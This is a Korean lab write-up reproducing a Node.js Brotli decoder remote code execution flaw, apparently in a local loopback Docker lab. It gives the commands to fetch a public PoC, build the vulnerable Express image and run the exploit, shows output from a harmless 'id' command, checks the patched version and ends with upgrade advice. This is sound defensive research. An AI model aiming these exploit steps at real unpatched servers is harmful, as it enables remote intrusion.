# Node2Shell (CVE-2026-111497) 재현 기록

> [!CAUTION]
> **보안 연구, 교육, 방어 검증 목적으로만 사용해야한다.**
>
> 이 자료는 본인이 소유하거나 명시적으로 허가받은 격리 환경에서만 사용해야 합니다.
> 제3자 시스템에 대한 접근, 서비스 중단, 데이터 수집, 지속성 확보 또는 탐지 회피에
> 사용해서는 안 됩니다.

## 결론

2026-10-23, WSL Ubuntu 24.04의 Docker에서 공개 PoC를 검토하고 Node.js의
Brotli 디코더 취약점인 CVE-2026-111497을 재현했다.

| 항목 | 결과 |
| --- | --- |
| 취약 환경 | Node.js `v24.22.0`, Express `5.3.0`, body-parser `2.4.0`, Linux x86-64 |
| 공격 표면 | `Content-Encoding: br` 요청을 처리하는 `express.json()` |
| RCE 증명 | HTTP 요청 소켓으로 `/usr/bin/id`의 새 출력이 반환됨 |
| 실제 출력 | `uid=1000(node) gid=1000(node) groups=1000(node)` |
| 성공 시도 | 1/16 |
| 수정 환경 | Node.js `v24.22.1`, 같은 Express 앱과 패키지 잠금 파일 |
| 수정 환경 결과 | `ERR__ERROR_FORMAT_BLOCK_SWITCH`, 명령 실행 없음, 서비스 정상 |

`id`는 상태를 변경하지 않는 비파괴적 명령이다. 역방향 셸, 파일 생성·삭제,
권한 상승, 자격 증명 접근 또는 외부 시스템 접속은 수행하지 않았다.

## 취약점 개요

Node.js에 포함된 Brotli 디코더가 잘못된 블록 전환을 처리하면서 오류 상태를
정상적인 추가 입력 요청처럼 취급해 디코딩을 계속할 수 있었다. 이 잘못된 상태는
인접 메모리에 대한 out-of-bounds write로 이어질 수 있으며, 정확한 바이너리와
메모리 배치가 맞는 환경에서는 제어 흐름 탈취와 원격 코드 실행으로 연결된다.

이번 재현의 Express 체인은 다음 조건에 의존한다.

- 공식 Node.js `v24.22.0` Linux x86-64 비-PIE 바이너리
- Express `5.3.0` 및 body-parser `2.4.0`
- `UV_THREADPOOL_SIZE=1`
- 허용된 요청 소켓 파일 디스크립터 `19`
- 실패 시 새 ASLR 배치로 다시 시작하는 컨테이너 내부 감독 루프
- 프로필에 고정된 ROP 가젯과 ASLR 주소 추측

따라서 이 결과는 모든 Node.js/Express 배포가 같은 방식으로 악용된다는 뜻이
아니다. 다만 공식 취약 런타임에서 네트워크 입력만으로 실제 명령 실행에 도달할 수
있음을 보여준다.

## 출처와 고정 버전

- [Node.js 2026년 10월 보안 릴리스](https://nodejs.org/en/blog/vulnerability/october-2026-security-releases)
- [Imperva의 Node2Shell RCE 검증](https://www.imperva.com/blog/node2shell-from-brotli-data-to-remote-code-execution/)
- [재현에 사용한 공개 PoC](https://github.com/dimasma0305/CVE-2026-111497-POC/tree/e3382551df02b3ac8c925aeeffb9e0d206f052d4)
- [upstream Brotli 수정](https://github.com/google/brotli/commit/0ed4268a4401abcb4472096340477cf4af7d1a2b)

사용한 PoC 저장소의 커밋은
`e3382551df02b3ac8c925aeeffb9e0d206f052d4`로 고정했다. 해당 저장소는
복제·수정·재배포 권한을 부여하지 않는 라이선스이므로 이 저장소에는 PoC 소스를
복사하지 않았다. 아래 절차는 원본을 별도 디렉터리에 내려받아 로컬 루프백
실험실에서만 실행한다.

## 재현 절차

### 1. PoC를 고정 커밋으로 받기

```bash
git clone https://github.com/dimasma0305/CVE-2026-111497-POC.git upstream
git -C upstream checkout e3382551df02b3ac8c925aeeffb9e0d206f052d4
cd upstream
```

실행 전 `poc.py`를 검토했다. 이 버전은 공격 대상을
`127.0.0.1`, `::1`, `localhost`로 제한하고, Express RCE 프로필의 명령을
`/usr/bin/id`로 고정한다. 임의 명령 인수는 받지 않는다.

### 2. 취약 이미지를 빌드하기

Docker Hub의 익명 요청 제한을 피하기 위해 동일한 OCI 다이제스트를 제공하는
Google 공개 미러를 사용했다.

```bash
docker pull --platform linux/amd64 \
  mirror.gcr.io/library/node@sha256:925de64a85319052d6971ae81ef2417da956e8a3a2c4a0fac732327970f017f5

docker build --platform linux/amd64 \
  --build-arg NODE_IMAGE=mirror.gcr.io/library/node@sha256:925de64a85319052d6971ae81ef2417da956e8a3a2c4a0fac732327970f017f5 \
  -t cve-2026-111497-lab:v24.22.0-express \
  -f lab/v24.22.0/express-body-parser/Dockerfile \
  lab/v24.22.0/express-body-parser
```

검증한 지문:

```text
Node version:             v24.22.0
Node binary SHA-256:      67ca5783febb8bf85736c79fcdd92c8d6d465a0eb2a082672bcdfa76a506751c
package-lock SHA-256:     c95ad8783444302c2e80a50d32fd92cfa8443e576bf22f6b1587603c6b546b6c
Express:                  5.3.0
body-parser:              2.4.0
```

### 3. 루프백 컨테이너에서 RCE 확인하기

```bash
docker run --platform linux/amd64 -d \
  --name cve-111497-express \
  --entrypoint sh \
  -e UV_THREADPOOL_SIZE=1 \
  -p 127.0.0.1:3000:3000 \
  cve-2026-111497-lab:v24.22.0-express \
  -lc 'while true; do node /app/server.js; sleep 0.1; done'

python3 poc.py \
  --profile node-24.22.0-express-5.3.0-bookworm-x86_64 \
  --timeout 30
```

관찰한 출력:

```text
attempt=1/16 staged_position=0x137ed748
PASS: RCE verified by fresh id output through the declared interface
profile=node-24.22.0-express-5.3.0-bookworm-x86_64
proof_channel=HTTP request socket stdout
proof_command=id
proof_stdout=uid=1000(node) gid=1000(node) groups=1000(node)
successful_attempt=1
```

실험 후 우리가 만든 컨테이너만 제거했다.

```bash
docker rm -f cve-111497-express
```

## 수정 버전 대조

같은 앱을 Node.js `v24.22.1` 이미지로 다시 빌드하고 PoC 시도를 1회로 제한했다.
사용한 이미지 다이제스트는
`sha256:6449e19d8184d84062525b6a7524def03146c2cb04a7f08b076680d0e8e4240a`이며,
Node 바이너리 SHA-256은
`e32e2d16081cf644f88392934288086e7662529d0d43277c34f7aad2207cfafb`였다.

```bash
docker build --platform linux/amd64 \
  --build-arg NODE_IMAGE=mirror.gcr.io/library/node:24.22.1-bookworm \
  -t cve-2026-111497-lab:v24.22.1-express \
  -f lab/v24.22.0/express-body-parser/Dockerfile \
  lab/v24.22.0/express-body-parser

python3 poc.py \
  --profile node-24.22.0-express-5.3.0-bookworm-x86_64 \
  --timeout 30 \
  --attempts 1
```

수정 버전은 다음 응답으로 요청을 거부했다.

```text
HTTP/1.1 400 Bad Request
ERR ERR__ERROR_FORMAT_BLOCK_SWITCH
```

그 뒤 `/health`는 계속 `PONG`을 반환했다. 즉 동일 입력에서 RCE 증거가 없었고
서비스도 중단되지 않았다.

## 실패 지점과 해결

- WSL의 Snap Docker 소켓이 `root:root`로 생성돼 일반 사용자 접근이 거부됐다.
  사용자나 그룹 구성을 변경하지 않고, WSL root로 Docker CLI만 실행했다.
- Docker Hub가 익명 manifest 요청에 `429 Too Many Requests`를 반환했다.
  이미지 버전을 바꾸지 않고 동일 다이제스트를 `mirror.gcr.io`에서 받아 해결했다.

## 방어 권고

- Node.js `22.23.4`, `24.22.1`, `26.12.1` 이상으로 즉시 업그레이드한다.
- `Content-Encoding: br` 요청 본문을 자동 해제하는 Express/body-parser 경로와,
  외부 Brotli 응답을 소비하는 `fetch()` 경로를 함께 조사한다.
- 컨테이너 태그만 보지 말고 실행 중인 Node 바이너리 버전과 해시를 확인한다.
- 패치 전 임시 방어로 신뢰할 수 없는 Brotli 입력을 제한하되, 이를 런타임
  업데이트의 대체책으로 취급하지 않는다.

원본 실행 기록은 [evidence/2026-10-23-wsl-docker.txt](evidence/2026-10-23-wsl-docker.txt)에
요약했다.

